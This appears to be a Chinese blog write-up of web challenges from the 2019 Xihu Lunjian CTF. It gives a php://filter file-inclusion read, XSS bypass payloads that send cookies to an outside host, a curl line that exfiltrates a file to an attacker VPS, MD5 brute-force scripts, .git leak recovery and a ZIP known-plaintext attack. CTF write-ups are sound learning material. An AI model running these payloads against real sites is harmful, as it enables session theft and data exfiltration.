---
title: 2019 西湖论剑 Web 复现
  - Writeup
  - CTF
date: 2019-04-25 21:02:00
---
蒟蒻的复现记录~

<!--more-->

## babyt3

babyt3(Ubuntu 16.04 php7.0) 61.164.47.198:10000

简单探测存在以下文件:index.php、dir.php、/.DS_Store。


![](/assets/images/move/1554987118360-7e79c95d-baaf-417a-bddd-7e92d5e94ca6.png)

由`include $_GET['file']`猜测存在文件包含~ 尝试PHP伪协议读取源代码：

```bash
http://61.164.47.198:10000/?file=php://filter/read=convert.base64-encode/resource=index.php
```

- index.php

```php
<?php
$a = @$_GET['file'];
if (!$a) {
	$a = './templates/index.html';
}
echo 'include $_GET[\'file\']';
if (strpos('flag',$a)!==false) {
	die('nonono');
}
include $a;
?>

<!--hint: ZGlyLnBocA== --> //-> dir.php
```

- dir.php

```php
<?php
$a = @$_GET['dir'];
if(!$a){
$a = '/tmp';
}
var_dump(scandir($a));
```

借助`dir.php`可以进行目录遍历，查找flag的位置。

```bash
//http://61.164.47.198:10000/dir.php?dir=/
array(25) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(10) ".dockerenv" [3]=> string(3) "bin" [4]=> string(4) "boot" [5]=> string(3) "dev" [6]=> string(3) "etc" [7]=> string(16) "ffffflag_1s_Her4" [8]=> string(4) "home" [9]=> string(3) "lib" [10]=> string(5) "lib64" [11]=> string(5) "media" [12]=> string(3) "mnt" [13]=> string(7) "my_init" [14]=> string(10) "my_service" [15]=> string(3) "opt" [16]=> string(4) "proc" [17]=> string(4) "root" [18]=> string(3) "run" [19]=> string(4) "sbin" [20]=> string(3) "srv" [21]=> string(3) "sys" [22]=> string(3) "tmp" [23]=> string(3) "usr" [24]=> string(3) "var" }
```

确定`flag`位于**/ffffflag_1s_Her4**，利用文件包含进行读取.

```bash
//http://61.164.47.198:10000/?file=php://filter/read=convert.base64-encode/resource=/ffffflag_1s_Her4
ZmxhZ3s4ZGMyNWZkMjFjNTI5NThmNzc3Y2U5MjQwOWUyODAyYX0=
//flag{8dc25fd21c52958f777ce92409e2802a}
```

## Breakout

![](/assets/images/move/1554988767996-25426f38-a16e-47a3-97d2-d53f27b6de8b.png)

任意账号密码均可登录，个人中心页面如下：

![](/assets/images/move/1554989062396-72a5539d-b01a-4c26-9391-b5c05e0db9c2.png)

- `message`页面可进行留言，经探测对`script`等关键字进行了过滤，替换为`:) `。
- `report`页面用于提交BUG，管理员会加上用户的token去登陆查验。
- `exec`页面可执行命令，不过需要以管理员的身份（token）。

这样一来攻击思路就很明显了,绕过XSS过滤，在`message`构造包含恶意脚本的留言页面提交至`report`，进而获取管理员`token`用于获取在`exec`以管理员的身份执行命令获取flag。

### XSS绕过

- Payload1

在test.html中写入script>document.location="http://example.com/"+btoa(document.cookie) </script>

```html
<link rel=import href=//example.com/test.html other=
```

- Payload2

HTML实体编码绕过关键字过滤, HTML标签内的实体编码会自动解码。

> 1.进制编码:&#xH;(16进制格式)、&#xD;(10进制形式)，最后的分号可以不要。
> 2.HTML实体编码。

```html
<iframe
src="javascrip&#x74;:location.href='vps_ip'+escape(top.document.cookie)">
</iframe>
```

- Payload3 

换行符绕过

```html
<img src=x onerror
=prompt(1)>
```

### MD5截断比较

这里采用牺牲空间换去时间的方法，生成大量MD5值来进行匹配符合的条目。

```python
//生成脚本
# -*- coding: utf-8 -*-
import hashlib
sum = []
j = 0
f = open("gen_md5.txt", "a")
for i in xrange(1000000000):
    tmp = (hashlib.md5(str(i)).hexdigest(),i)
    sum.append(tmp)
    j = j+1
    if(j==10000000):
        for i in sum:
            f.write("{0} {1}".format(i,"\n"))
        j=0
        sum = []
f.close()
//检索脚本
# -*- coding: utf-8 -*-
f = open("gen_md5.txt", "r")
for line in f.readlines():
    if line[2:8] == 'c99dc2':
        print(line)
        break
```

提交获取管理员cookie：

```php
PHPSESSID=slsqh6lgqgtgkhfhitj327r7p7;token=ISMvKXpXpadDiUoOSoAfww==; admin=admin_!@@!_admin_admin_hhhhh
```


### exec

使用管理员cookie登录后可执行命令，但没有回显，尝试dns解析带出数据。

```payload
curl http:your_vps_ip:port/?$(cat /flag.txt|base64)
//ZmxhZ3tmYTUxMzlwYWU4MDhjNzA0ODVkZDVmMzAzMzcwMjZkNnO=
//flag{fa5139pae808c70485dd5f30337026d6}
```

## 猜猜flag是什么

![](/assets/images/move/1554998036810-320186e6-f98a-4349-a516-2a4d41ac42fb.png)

探测到`.DS_Store`文件，进行还原:

![](/assets/images/move/1554998298013-b7c0a254-8e1b-4664-91e5-ba73a51e17a0.png)

访问`/e10adc3949ba59abbe56e057f20f883e/`:

![](/assets/images/move/1554998403503-f7d8560e-b7c2-4751-9ca0-294672d223b2.png)

在此目录下发现`.git`泄露，使用Githack进行还原。

![](/assets/images/move/1555032494963-e02984c3-1570-47e5-893e-6af105072e12.png)

加密压缩包`BackupForMySite.zip`中包含`index.php`、`lengzhu.jpg`以及文件`hint`。已知`index.php`、`lengzhu.jpg`文件，我们可以对压缩包进行明文攻击。

> 简单来说，ZIP明文攻击就是利用已知文件找加密密钥，利用密钥来解锁其它加密文件，因为ZIP压缩包里的所有文件都是使用同一个加密密钥来加密的。

压缩文件`index.php`、`lengzhu.jpg`作为已知明文，使用`APCHPR`进行明文攻击。

![](/assets/images/move/1555033592861-03d3fa8f-cd7a-4ccb-910b-b0bfda917693.png)

成功获取密匙，解压得到hint:

```bash
code is 9faedd5999937171912159d28b219d86
well ok ur good...By the way, flag saved in flag/seed.txt 
```

提交code~

```bash
http://61.164.47.198:10002/?code=9faedd5999937171912159d28b219d86
```

![](/assets/images/move/1555033816792-8357863c-c4ea-4c3d-8962-9d8b4757c1c0.png)

可知flag在flag/seed.txt目录下，code=334579419是以seed为种子的播种随机数，可由code进行种子爆破得到seed~

![](/assets/images/move/1555034260821-5c126ad5-9e3b-4ded-b9eb-84341f609989.png)

在`http://61.164.47.198:10002/flag/814073.txt`获取到flag{0730b6193000e9334b12cf7c95fbc736}。
